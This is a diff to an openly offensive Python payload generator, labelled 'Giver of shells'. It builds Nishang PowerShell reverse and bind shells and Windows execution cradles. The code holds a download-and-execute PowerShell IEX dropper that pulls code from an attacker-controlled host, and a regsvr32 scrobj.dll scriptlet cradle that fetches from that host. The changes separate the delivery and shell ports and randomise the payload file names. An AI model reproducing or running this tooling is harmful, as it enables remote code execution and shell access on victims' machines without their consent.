@@ -1,5 +1,4 @@
 #!python3
-
 import argparse, base64, os, random, string
 # Red - Important information
 # Yellow - Notice me, eventually
@@ -7,18 +6,24 @@ import argparse, base64, os, random, string
 from lib import logger
 
 parser = argparse.ArgumentParser(description = "Giver of shells")
-parser.add_argument('-i', '--ip-address', help="Attacker IP Address", required=True)
-parser.add_argument('-p', '--port', help="Attacker Port")
-parser.add_argument('-d', '--directory', help="Directory for generated payloads")
+parser.add_argument('-i', '--ip-address', metavar="",help="Attacker IP Address", required=True)
+parser.add_argument('-p', '--cradle-port', metavar="", help="Port for receiving shells")
+parser.add_argument('-w', '--web-delivery', metavar="", help="Port for serving shells")
+parser.add_argument('-d', '--directory', metavar="", help="Directory for generated payloads")
 args = parser.parse_args()
 
 if args.ip_address != None:
 	ipaddr = args.ip_address
 
-if args.port != None:
-	port = args.port
+if args.cradle_port != None:
+	cradle_port = args.cradle_port
 else:
-	port = "12345"
+	cradle_port = "12345"
+
+if args.web_delivery != None:
+	web_delivery = args.web_delivery
+else:
+	web_delivery = "80"
 
 if args.directory != None:
 	if args.directory.endswith("/"):
@@ -27,10 +32,6 @@ if args.directory != None:
 		generated_payload_directory = args.directory + "/"
 else:
 	generated_payload_directory = "./web_delivery/"
-
-logger.red_fg("The attacker server is set to %s:%s"  % (ipaddr, port))
-logger.red_fg("Writing payloads to %s" % generated_payload_directory)
-print()
 
 resource_directory = './resources/'
 cradle_commands_file = generated_payload_directory+'cradle_commands.txt'
@@ -42,7 +43,6 @@ def randomString(length=6):
 
 def add_cradle_call_command(cradle_method,execution_cradle_command): # cradle_method is the name of the method used for the execution, its only used in the 'cradle_commands.txt' file as a label.
 	# execution is the full command copied into the windows prompt
-	open(cradle_commands_file, 'w').close()
 	with open(cradle_commands_file,'a') as filecontents:
 		filecontents.write('%s:\n' % cradle_method)
 		filecontents.write(execution_cradle_command+'\n')
@@ -93,7 +93,7 @@ def get_resource(filename):
 		if "TEMPLATEIPADDRESS" in resource_data:
 			resource_data = resource_data.replace("TEMPLATEIPADDRESS",ipaddr)
 		if "TEMPLATEPORT" in resource_data:
-			resource_data = resource_data.replace("TEMPLATEPORT",port)
+			resource_data = resource_data.replace("TEMPLATEPORT",cradle_port)
 		if "RAW_DROPPER_BASE64" in resource_data:
 			resource_data = resource_data.replace("RAW_DROPPER_BASE64",raw_dropper_base64)
 	return resource_data
@@ -109,13 +109,13 @@ def set_resource(filename, filecontents):
 	destination_file.close()
 
 def register_shell(filename, shellcontent):
-	random_shellname = 'shell_%s.ps1' % randomString()
+	random_shellname = 'ps%s' % randomString()
 	shell_dictionary[filename] = random_shellname
 	set_resource(random_shellname, shellcontent)
 
 # The base command to pull files from the attackers machine to the victim machine
 def raw_dropper(filename):
-	base_payload="IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (ipaddr, port, filename)
+	base_payload="IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (ipaddr, web_delivery, filename)
 	return base_payload
 
 def raw_dropper_base64(filename):
@@ -158,8 +158,8 @@ def regsvr32():
 	regsvr32_template_file = resource_directory+'regsvr32.xml'
 	b64_payload = raw_dropper_base64(shell_dictionary[shell_name]) # generates the UTF-16LE powershell IEX payload and encodes it into B64 and stores it
 	regsvr_cradle_scriptlet = get_cradle(regsvr32_template_file,b64_payload) # takes in the template cradle and the b64 payload
-	random_sct_filename = '%s.sct' % randomString(12)
-	execution_cradle_command = 'regsvr32 /s /n /u /i:http://%s:%s/%s scrobj.dll' % (ipaddr,port,random_sct_filename)
+	random_sct_filename = 'sct%s' % randomString(12)
+	execution_cradle_command = 'regsvr32 /s /n /u /i:http://%s:%s/%s scrobj.dll' % (ipaddr,web_delivery,random_sct_filename)
 	register_cradle('regsvr32',shell_name,random_sct_filename, regsvr_cradle_scriptlet,execution_cradle_command) # filename, shellcontent,execution_cradle. 
 
 def cradles():
@@ -169,8 +169,10 @@ def shells():
 	nishang_powershell_reverse() # create and show 
 	nishang_powershell_bind() # create and show 
 
-
-logger.banner()
+print("The Web Delivery Server is at: %s:%s"  % (logger.red_fg(ipaddr), logger.red_fg(web_delivery)))
+print("Shells receiving at: %s:%s"  % (logger.red_fg(ipaddr), logger.red_fg(cradle_port)))
+print("Writing payloads to: %s" % logger.red_fg(generated_payload_directory))
+print()
 
 logger.heading('Shells')
 
@@ -185,3 +187,7 @@ logger.heading('Cradles')
 print_cradle_dictionary()
 
 print('All execution cradles can be found in %s!' % logger.green_fg(cradle_commands_file))
+
+print()
+
+print('[%s]\tWritten by %s & %s (%s)'% (logger.yellow_fg('+'),logger.yellow_fg('@michaelranaldo'),logger.yellow_fg('@mez-0'),logger.yellow_fg('https://ad-995.group')))
